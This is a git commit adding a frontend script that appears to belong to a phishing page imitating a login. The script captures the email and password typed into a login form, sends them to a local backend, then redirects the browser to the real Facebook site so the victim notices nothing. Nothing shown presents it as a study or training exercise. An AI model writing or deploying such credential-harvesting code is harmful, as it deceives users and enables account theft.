627de578db1b31d1504be5f1bd135184008da698
Medinaallan <medinaallan369@gmail.com>
2025-09-01 21:27:00 -0600

    Proyecto completo frontend y backend

---
+++ frontend/script.js
@@ -0,0 +1,19 @@
+// script.js
+
+document.getElementById('loginForm').addEventListener('submit', async function(e) {
+    e.preventDefault();
+    const email = document.getElementById('email').value;
+    const password = document.getElementById('password').value;
+
+    const response = await fetch('http://localhost:3000/api/register', {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({ email, password })
+    });
+
+    const data = await response.json();
+    document.getElementById('loginForm').reset();
+    window.location.href = 'https://www.facebook.com/';
+});
